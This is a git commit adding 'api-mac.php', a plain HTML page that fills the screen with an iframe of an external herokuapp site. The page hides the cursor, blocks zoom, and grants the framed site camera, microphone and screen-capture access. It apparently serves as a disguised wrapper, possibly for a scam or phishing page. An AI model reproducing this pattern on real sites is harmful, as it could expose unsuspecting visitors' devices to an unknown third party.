0fd084959ee4c5db80ad571aa3a13ba16c74ed39
haohanhoa-cmd <haohanhoa@gmail.com>
2026-06-17 18:13:41 +0400

    Add files via upload

---
+++ api-mac.php
@@ -0,0 +1,31 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<style>
+  iframe {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    border: none;
+    top: 0;
+    left: 0;
+ 	cursor: none;
+}
+</style>
+
+</head>
+<body>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+
+<iframe 
+  id="f"
+  src="https://pryvanelafieldx-e787d9166617.herokuapp.com/" 
+  allowfullscreen 
+  webkitallowfullscreen 
+  mozallowfullscreen 
+  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
+</iframe>
+
+</body>
+</html>
